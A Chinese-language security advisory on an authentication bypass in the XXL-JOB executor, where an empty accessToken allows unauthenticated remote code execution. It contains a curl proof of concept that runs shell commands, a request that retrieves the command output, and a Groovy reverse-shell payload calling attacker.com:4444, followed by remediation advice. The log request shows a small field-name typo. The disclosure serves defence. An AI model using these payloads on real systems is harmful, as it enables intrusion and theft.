# V-X001: XXL-JOB 执行器空 Token 校验绕过导致未授权 RCE

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | XXL-JOB（分布式任务调度平台）|
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-306: 关键功能缺少身份验证 / CWE-94: 代码注入 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（若执行器端口可达）|
| 代码仓库 | https://github.com/xuxueli/xxl-job |

## 漏洞描述

XXL-JOB 的执行器 (`xxl-job-core`) 对外开放一个 HTTP 端口（默认 9999）用于接收调度中心下发的任务触发请求。访问控制依赖 `xxl.job.accessToken` 配置项。当且仅当该配置项**既不为 null 也不为空字符串**时才会校验请求携带的 `accessTokenReq`：

```java
// EmbedServer.java:179-183
if (accessToken != null
        && !accessToken.trim().isEmpty()
        && !accessToken.equals(accessTokenReq)) {
    return Response.ofFail("The access token is wrong.");
}
```

然而 XXL-JOB 的默认配置模板 `application.properties`：

```properties
xxl.job.accessToken=default_token
```

许多部署者为了"去除默认值"或忘记配置时设置为 `xxl.job.accessToken=`（空）。此时 `accessToken` 为空字符串，上述校验**直接被跳过**，任何人发送 POST 请求均可调用执行器。

### 关键接口 `/run`

执行器接收 `TriggerRequest`，调用 `executorBiz.run(triggerParam)`。`TriggerRequest` 包含：
- `executorHandler`：处理器名（或在 GlueType != BEAN 时为 Groovy / Shell / Python 脚本源码）
- `glueType`：`GLUE_GROOVY`、`GLUE_SHELL`、`GLUE_PYTHON`、`GLUE_PHP`、`GLUE_NODEJS`、`GLUE_POWERSHELL`
- `glueSource`：脚本内容

当 `glueType=GLUE_SHELL`、`glueSource="id; whoami"` 时，执行器会在目标服务器上直接执行 Shell 命令 → **RCE**。

## 漏洞详情

### 受影响场景

- 默认 Docker 镜像未覆盖 `accessToken` → 易出现空字符串
- 开发/测试环境通常直接注释掉该行
- 使用 Nacos/Apollo 配置中心时，若 key 不存在，Spring 默认注入空字符串

### 网络可达性

- 执行器默认监听 `0.0.0.0:9999`
- 如果内网没有网络隔离，其他租户或外网可直达
- 老版本 Docker Compose 把 9999 端口显式 `ports` 暴露

## 概念验证

### PoC: GLUE_SHELL 未授权 RCE

```bash
curl -X POST "http://<executor-host>:9999/run" \
  -H "Content-Type: application/json" \
  -d '{
    "jobId": 1,
    "executorHandler": "",
    "executorParams": "",
    "executorBlockStrategy": "SERIAL_EXECUTION",
    "executorTimeout": 0,
    "logId": 1,
    "logDateTime": 1744600000000,
    "glueType": "GLUE_SHELL",
    "glueSource": "id > /tmp/xxljob_rce; whoami >> /tmp/xxljob_rce",
    "glueUpdatetime": 1744600000000,
    "broadcastIndex": 0,
    "broadcastTotal": 1
  }'
```

### 回显获取

XXL-JOB 执行器提供 `/log` 接口返回任务日志，攻击者可二次请求拿到命令输出：

```bash
curl -X POST "http://<executor-host>:9999/log" \
  -H "Content-Type: application/json" \
  -d '{"logDateTim":1744600000000,"logId":1,"fromLineNum":1}'
```

### GLUE_GROOVY 反弹 Shell

```json
{
  "glueType": "GLUE_GROOVY",
  "glueSource": "new ProcessBuilder(['bash','-c','bash -i >& /dev/tcp/attacker.com/4444 0>&1']).start()"
}
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `xxl-job-core/.../server/EmbedServer.java` | 179-183 | accessToken 为空时跳过校验 |
| `xxl-job-core/.../biz/impl/ExecutorBizImpl.java` | - | `run()` 接收任意 glueSource 编译执行 |
| `xxl-job-executor-sample-*/application.properties` | - | 默认 `xxl.job.accessToken=default_token`，易被清空 |

## 影响

1. **未授权 RCE**：执行器所在节点完全沦陷
2. **横向移动**：通常执行器在业务生产节点，可直接操作业务代码 / 数据库配置
3. **大规模感染**：分布式部署场景下所有执行器节点同时受影响
4. **难以察觉**：执行器日志仅在调度中心侧有调用记录，直连绕过调度中心时无感知
5. **历史 CVE**：已有多个 XXL-JOB 相关 CVE（如 CVE-2022-36157、CVE-2023-48397）

## 修复建议

1. **强制 accessToken 非空**：应用启动时断言 `@Value` 非空，否则拒绝启动
   ```java
   @PostConstruct
   public void validate() {
       Assert.hasText(accessToken, "xxl.job.accessToken must be configured");
   }
   ```
2. **升级到 XXL-JOB ≥ 2.4.1**：关注官方后续的安全更新
3. **执行器端口绑定内网**：`server.address=10.x.x.x` 或防火墙仅允许调度中心 IP
4. **禁用 GLUE_SHELL / GLUE_GROOVY**：生产环境强制使用 BEAN 类型，不执行外部脚本
5. **增加 IP 白名单**：执行器层面校验客户端 IP 是否在调度中心列表内
6. **HTTPS + 双向证书**：替代简单 accessToken 方案

## 参考

- XXL-JOB CVE 历史：https://github.com/xuxueli/xxl-job/security

## 验证环境

- 源代码：xxl-job 最新分支（静态代码分析）
- 框架：Spring Boot + 自研嵌入式 HTTP 服务
- 日期：2026-04-14
